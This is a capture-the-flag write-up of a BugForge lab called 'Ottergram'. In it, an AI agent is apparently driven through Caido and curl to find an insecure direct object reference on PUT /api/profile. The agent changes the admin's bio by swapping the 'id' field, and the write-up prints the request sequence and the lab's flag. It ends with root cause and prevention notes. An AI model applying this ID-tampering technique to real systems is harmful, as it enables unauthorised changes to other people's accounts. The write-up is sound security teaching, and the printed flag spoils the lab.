---
title: Ottergram - IDOR
tags:
  - bugforge
  - IDOR
  - broken-access-control
---

- Weekend, relax ... why not some Broken Access Control testing :)

- I am letting my MCP loose today, only mentioning what to look for.
- Focusing the MCP is definitely an advantage, not only to use less tokens but save time and effort, as well as upgrade the skill it has so when a future problem like this shows up, testing is much quicker and painless.

## Enumeration

- Clicking around and playing with the app for a while...
- This has become part of methodology, no matter whether I see an issue right away or not
- I have managed to build a skill to always learn the application, how does it respond and what are the potential issues I can exploit

- Loaded my usual skill and off I went!

### Step 1

```bash
⏺ Skill(pentest-webapp)
  ⎿  Successfully loaded skill

⏺ Starting IDOR testing on the BugForge CTF target. Let me first check Caido for any captured requests to understand the app structure.

⏺ caido - caido_list_requests (MCP)(limit: 50)
  ⎿  {
       "hasMore": true,
       "nextCursor": "eyJpZCI6IjUwIiwib3JkZXJfdmFsdWUiOm51bGx9",
     … +369 lines (ctrl+o to expand)
  ⎿  {
       "entries": [
         {
     … +7 lines (ctrl+o to expand)

⏺ The sitemap shows the target domain. Let me get requests from the current target and explore the sitemap further.

⏺ caido - caido_list_requests (MCP)(httpql: "req.host.cont:\"lab-1769869490510\"", limit: 100)
  ⎿  {
       "hasMore": false,
       "nextCursor": "eyJpZCI6IjM0MjYiLCJvcmRlcl92YWx1ZSI6bnVsbH0=",
     … +237 lines (ctrl+o to expand)

⏺ caido - caido_get_sitemap (MCP)(parentId: "1")
  ⎿  {
       "entries": [
         {
     … +46 lines (ctrl+o to expand)

⏺ Good - I can see the API structure. Key endpoints:
  - /api/register - POST
  - /api/login - POST
  - /api/posts - GET
  - /api/profile/{username} - GET
  - /api/posts/{id}/like - POST
  - /api/posts/{id}/comments - GET/POST
```

### Step 2

```bash
 Let me examine the API requests more closely to understand the IDs and data structures.

⏺ caido - caido_get_request (MCP)(ids: ["3395","3404","3407","3419","3411","3412","3413"], include: ["requestHeaders","requestBody","responseHeaders","responseBody"])
  ⎿  {
       "requests": [
         {
     … +257 lines (ctrl+o to expand)

⏺ Now I have a clear picture of the app. Key observations:

  Users:
  - User 1: otter_lover
  - User 2: admin (interesting!)
  - User 3: sea_otter_fan
  - User 4: tester (my user)

  IDs to test for IDOR:
  - /api/profile/{username} - uses username, not numeric ID
  - /api/posts/{id}/like - post ID
  - /api/posts/{id}/comments - post ID
  - User IDs in responses (1, 2, 3, 4)
```

### Step 3

```bash
 Let me check the JS file for API endpoints and look for profile update/account modification endpoints (WRITE operations - higher priority per skill).

⏺ caido - caido_get_request (MCP)(ids: ["3389"], include: ["responseBody"], bodyLimit: 10000)
  ⎿  {
       "id": "3389",
       "response": {
     … +46 lines (ctrl+o to expand)

⏺ The JS is minified. Let me search for API endpoint patterns within it.

⏺ Bash(curl -s "https://lab-1769869490510-qc54ar.labs-app.bugforge.io/static/js/main.300c5045.js" | grep -oE '"/api/[^"]+"|/api/[a-zA-Z0-9/_-]+' | sort -u)
  ⎿  "/api/admin"
     "/api/login"
     "/api/posts"
     … +5 lines (ctrl+o to expand)

⏺ Interesting - there's /api/admin endpoint! Let me test that and also look for profile update endpoints (PUT/PATCH operations for IDOR).

⏺ caido - caido_send_request (MCP)(raw: "GET /api/admin HTTP/1.1\nHost: lab-1769869490510-qc54ar.labs-app.bugforge.io\nAuthorization: Bearer
                                  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I\nAccept: application/json")
  ⎿  {
       "message": "Request sent to https://lab-1769869490510-qc54ar.labs-app.bugforge.io:443",
       "sessionId": "1",
     … +2 lines (ctrl+o to expand)
```

### Step 4

```bash
⏺ caido - caido_send_request (MCP)(raw: "GET /api/profile/admin HTTP/1.1\nHost: lab-1769869490510-qc54ar.labs-app.bugforge.io\nAuthorization: Bearer
                                  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I\nAccept: application/json")
  ⎿  Error: failed to send request: replay error: TaskInProgressUserError

⏺ caido - caido_send_request (MCP)(raw: "PUT /api/profile/tester HTTP/1.1\nHost: lab-1769869490510-qc54ar.labs-app.bugforge.io\nAuthorization: Bearer
                                  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I\nContent-Type: application/json\nAccept: application/json\n\n{\"bio\": \"test
                                  bio\"}")
  ⎿  Error: failed to send request: replay error: TaskInProgressUserError

⏺ Got TaskInProgressUserError - let me wait and try again.

⏺ caido - caido_list_requests (MCP)(httpql: "req.host.cont:\"lab-1769869490510\"", limit: 10)
  ⎿  {
       "hasMore": true,
       "nextCursor": "eyJpZCI6IjMzOTciLCJvcmRlcl92YWx1ZSI6bnVsbH0=",
     … +63 lines (ctrl+o to expand)
  ⎿  {
       "sessions": [
         {
     … +16 lines (ctrl+o to expand)

⏺ caido - caido_get_replay_entry (MCP)(id: "32")
  ⎿  Error: failed to get replay entry: graphql: Unknown field "isTls" on type "ConnectionInfo".
```

- At this point I found a small issue inside of the MCP

```
Error 1: TaskInProgressUserError

  Cause: The MCP tries to reuse the same replay session for concurrent requests. When one request is in-flight, subsequent requests fail.

  Fix needed in MCP:
  // Current: reuses single session
  const sessionId = "1";

  // Fix: create new session per request OR wait for completion
  const session = await createNewReplaySession();
  
  ---
  
  Error 2: Unknown field "isTls" on type "ConnectionInfo"

  Cause: GraphQL schema mismatch. The MCP queries for isTls field but Caido's current schema doesn't have it. API changed between Caido versions.

  Fix needed in MCP:
  # Current query (broken)
  query { replayEntry { connection { isTls } } }

  # Fix: use correct field name from current schema
  query { replayEntry { connection { tls } } }  # or whatever the actual field is
```

- Flag and streak are life ... fix coming later :)
- Meanwhile ... we switch to `curl`

### Step 5

```bash
⏺ Let me try sending requests via curl instead due to the MCP issue.

⏺ Bash(TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I"
      BASE="http…)
  ⎿  === /api/admin ===
     {
       "error": "Admin access required"
     … +44 lines (ctrl+o to expand)

⏺ So I can read admin's profile (IDOR on read). Now let me find WRITE endpoints - check for profile update methods and other endpoints.

⏺ Bash(TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I"
      BASE="http…)
  ⎿  === PATCH /api/profile/tester ===
     <!DOCTYPE html>
     <html lang="en">
     … +44 lines (ctrl+o to expand)

⏺ PUT /api/profile accepts requests and wants a user ID. This is a potential IDOR vector. Let me test it.

⏺ Bash(TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I"
      BASE="http…)
  ⎿  === PUT /api/profile - update MY profile (user_id: 4) ===
     {
       "error": "User ID is required"
     … +35 lines (ctrl+o to expand)

⏺ Hmm, still says "User ID is required". Let me try different field names.

⏺ Bash(TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0ZXIiLCJpYXQiOjE3Njk4Njk1Mzd9.WPONjYFT45Z7sRceXbuBJl4uuBaM94egs5XI-YDn29I"
      BASE="http…)
  ⎿  === Try 'id' field ===
     {
       "message": "Profile updated successfully"
     … +23 lines (ctrl+o to expand)

⏺ It works with id field. Now let's test IDOR - can I update admin's profile (id: 2)?
```

### Final Step

```bash
⏺ IDOR confirmed!

  Summary

  Vulnerability: IDOR on PUT /api/profile endpoint

  Details:
  - Endpoint: PUT /api/profile
  - Vulnerable parameter: id in JSON body
  - Impact: Can update ANY user's profile by specifying their user ID
  - My user: id=4 (tester)
  - Admin user: id=2

  Proof:
  - Sent {"id": 2, "bio": "HACKED_BY_TESTER"} with my (tester) auth token
  - Successfully modified admin's profile bio
  - Flag revealed in response: bug{0z2LlicV2bdbJlo0xNalOUhSdlxh5QXM}

  Root Cause: The endpoint trusts the id field from user input without verifying it matches the authenticated user's ID from the JWT token.

  This is a CRITICAL IDOR (WRITE) - allows account modification of any user including admin.
```

![](/BugForge/img/otter1.png)
![](/BugForge/img/otter2.png)
![](/BugForge/img/otter3.png)
![](/BugForge/img/otter4.png)

## Security Takeaways

### Vulnerability: 
  - `IDOR on Profile Update Endpoint`

### Endpoint: 
- `PUT /api/profile`

### The Flaw:
- Backend accepts id field from request body to determine which user profile to update
- No server-side validation that id matches authenticated user from JWT
- JWT contains {"id":4,"username":"tester"} but server blindly trusts body {"id":2}

### Why This Happens

  ```bash
  // VULNERABLE pattern
  app.put('/api/profile', (req, res) => {
    const userId = req.body.id;  // ❌ Trusts user input
    updateProfile(userId, req.body);
  });

  // SECURE pattern
  app.put('/api/profile', (req, res) => {
    const userId = req.user.id;  // ✅ Uses authenticated user from JWT
    updateProfile(userId, req.body);
  });
  ```

### Testing Methodology

  1. Identify all endpoints with IDs - profile, posts, comments, likes
  2. Prioritise WRITE over READ - `PUT/PATCH/DELETE > GET`
  3. Test different ID field names - `id, user_id, userId, query params, path params`
  4. Compare before/after - verify change actually applied

### Prevention

  - Never trust user-supplied IDs for ownership - use session/JWT identity
  - Implement authorization middleware - check resource ownership before modification
  - Use indirect references - /api/profile/me instead of /api/profile?id=X
  - Log and alert on cross-user access attempts
